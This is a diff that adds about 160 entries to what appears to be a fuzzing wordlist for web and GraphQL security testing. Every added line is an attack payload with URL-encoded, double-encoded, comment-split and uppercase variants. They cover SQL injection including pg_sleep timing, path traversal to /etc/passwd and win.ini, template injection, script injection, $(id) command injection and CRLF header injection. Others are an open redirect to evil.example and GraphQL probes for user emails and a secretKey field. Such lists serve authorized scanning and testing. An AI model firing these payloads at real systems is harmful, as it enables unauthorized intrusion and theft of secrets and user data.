@@ -78,3 +78,164 @@ graphql_0
 {__schema{types{name}}}%0a0
 query IntrospectionQuery { __schema { queryType { name } } }?v=1
 query IntrospectionQuery { __schema { queryType { name } } }&v=1
+%257B__schema%257Btypes%257Bname%257D%257D%257D
+{__schema{types{name}}}?aurose=1
+{__schema{types{name}}}&aurose=1
+{__type(name:"Query"){name fields{name}}}
+%7B__type%28name%3A%22Query%22%29%7Bname%20fields%7Bname%7D%7D%7D
+%257B__type%2528name%253A%2522Query%2522%2529%257Bname%2520fields%257Bname%257D%257D%257D
+{__type(name:"Query"){name/**/fields{name}}}
+{__TYPE(NAME:"QUERY"){NAME FIELDS{NAME}}}
+{__type(name:"Query"){name fields{name}}}?aurose=1
+{__type(name:"Query"){name fields{name}}}&aurose=1
+query%2520IntrospectionQuery%2520%257B%2520__schema%2520%257B%2520queryType%2520%257B%2520name%2520%257D%2520%257D%2520%257D
+query/**/IntrospectionQuery/**/{/**/__schema/**/{/**/queryType/**/{/**/name/**/}/**/}/**/}
+query IntrospectionQuery { __schema { queryType { name } } }?aurose=1
+query IntrospectionQuery { __schema { queryType { name } } }&aurose=1
+mutation { __typename }
+mutation%20%7B%20__typename%20%7D
+mutation%2520%257B%2520__typename%2520%257D
+mutation/**/{/**/__typename/**/}
+MUTATION { __TYPENAME }
+mutation { __typename }?aurose=1
+mutation { __typename }&aurose=1
+{user(id:1){id email role}}
+%7Buser%28id%3A1%29%7Bid%20email%20role%7D%7D
+%257Buser%2528id%253A1%2529%257Bid%2520email%2520role%257D%257D
+{user(id:1){id/**/email/**/role}}
+{USER(ID:1){ID EMAIL ROLE}}
+{user(id:1){id email role}}?aurose=1
+{user(id:1){id email role}}&aurose=1
+{ users { edges { node { id } } } }
+%7B%20users%20%7B%20edges%20%7B%20node%20%7B%20id%20%7D%20%7D%20%7D%20%7D
+%257B%2520users%2520%257B%2520edges%2520%257B%2520node%2520%257B%2520id%2520%257D%2520%257D%2520%257D%2520%257D
+{/**/users/**/{/**/edges/**/{/**/node/**/{/**/id/**/}/**/}/**/}/**/}
+{ USERS { EDGES { NODE { ID } } } }
+{ users { edges { node { id } } } }?aurose=1
+{ users { edges { node { id } } } }&aurose=1
+query { __typename }
+query%20%7B%20__typename%20%7D
+query%2520%257B%2520__typename%2520%257D
+query/**/{/**/__typename/**/}
+QUERY { __TYPENAME }
+query { __typename }?aurose=1
+query { __typename }&aurose=1
+{systemConfig{secretKey}}
+%7BsystemConfig%7BsecretKey%7D%7D
+%257BsystemConfig%257BsecretKey%257D%257D
+{SYSTEMCONFIG{SECRETKEY}}
+{systemConfig{secretKey}}?aurose=1
+{systemConfig{secretKey}}&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+{__schema{types{name}}}::var0
+%7B__schema%7Btypes%7Bname%7D%7D%7D::v0
+/graphql/probe/0
+{__type(name:"Query"){name fields{name}}}::var1
+%7B__type%28name%3A%22Query%22%29%7Bname%20fields%7Bname%7D%7D%7D::v1
+/graphql/probe/1
+query IntrospectionQuery { __schema { queryType { name } } }::var2
+query%20IntrospectionQuery%20%7B%20__schema%20%7B%20queryType%20%7B%20name%20%7D%20%7D%20%7D::v2
+/graphql/probe/2
+mutation { __typename }::var3
+mutation%20%7B%20__typename%20%7D::v3
+/graphql/probe/3
+{user(id:1){id email role}}::var4
+%7Buser%28id%3A1%29%7Bid%20email%20role%7D%7D::v4
+/graphql/probe/4
+{ users { edges { node { id } } } }::var5
+%7B%20users%20%7B%20edges%20%7B%20node%20%7B%20id%20%7D%20%7D%20%7D%20%7D::v5
+/graphql/probe/5
+query { __typename }::var6
+query%20%7B%20__typename%20%7D::v6
+/graphql/probe/6
+{systemConfig{secretKey}}::var7
+%7BsystemConfig%7BsecretKey%7D%7D::v7
+/graphql/probe/7
+' OR '1'='1::var8
+%27%20OR%20%271%27%3D%271::v8
+/graphql/probe/8
+" OR "1"="1::var9
+%22%20OR%20%221%22%3D%221::v9
+/graphql/probe/9
+' AND 1=1 --::var10
+%27%20AND%201%3D1%20--::v10
+/graphql/probe/10
+' AND 1=2 --::var11
+%27%20AND%201%3D2%20--::v11
+/graphql/probe/11
